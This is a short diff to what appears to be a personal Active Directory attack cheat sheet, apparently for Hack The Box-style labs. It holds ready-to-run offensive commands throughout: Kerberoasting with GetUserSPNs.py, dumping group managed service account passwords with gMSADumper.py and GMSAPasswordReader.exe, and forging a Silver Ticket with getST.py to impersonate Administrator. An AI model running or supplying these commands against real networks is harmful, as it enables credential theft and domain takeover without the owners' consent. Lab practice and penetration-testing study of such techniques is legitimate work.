@@ -262,8 +262,9 @@ GetUserSPNs.py -request domain/bob:pass -dc-ip 192.168.200.5 -outputfile kbroast
 
 ===================================
 GMSA User Crack 
-gMSADumper.py -u 'mike' -p paxxword -d mydom.htb    
-  
+gMSADumper.py -u 'mike' -p paxxword -d mydom.htb     ..remote pull, with user/creds
+GMSAPasswordReader.exe --accountname svc_apache      ..target connected acct able to read gmsa
+
 ===================================
 Silver Ticket 
 getST.py -spn www/dc.mike.com -impersonate Administrator domain/svc_gmsa$   
